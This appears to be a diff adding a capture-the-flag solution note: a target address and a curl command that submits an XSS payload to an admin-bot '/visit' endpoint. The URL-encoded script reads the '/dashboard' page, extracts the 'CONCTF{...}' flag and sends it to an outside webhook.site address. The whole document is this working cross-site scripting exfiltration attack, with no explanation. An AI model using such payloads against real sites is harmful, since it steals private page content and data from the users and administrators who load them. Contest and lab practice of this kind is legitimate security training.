@@ -1,0 +1,7 @@
+ http://16.171.193.216:3000
+ 
+ 
+ 
+ curl -X POST  http://16.171.193.216:3000/visit \
+  -H "Content-Type: application/json" \
+  -d '{"uri": "/feedback?text=%3Cscript%3Efetch(%27/dashboard%27).then(r%3D%3Er.text()).then(html%3D%3E%7Bconst%20flag%3Dhtml.match(/CONCTF%7B%5B%5E%7D%5D%2B%7D/)%5B0%5D%3Bfetch(%27https%3A//webhook.site/49dbef6f-e23b-4cda-82ed-9256bf4546b4%3Fflag%3D%27%2BencodeURIComponent(flag))%3B%7D)%3B%3C/script%3E"}'
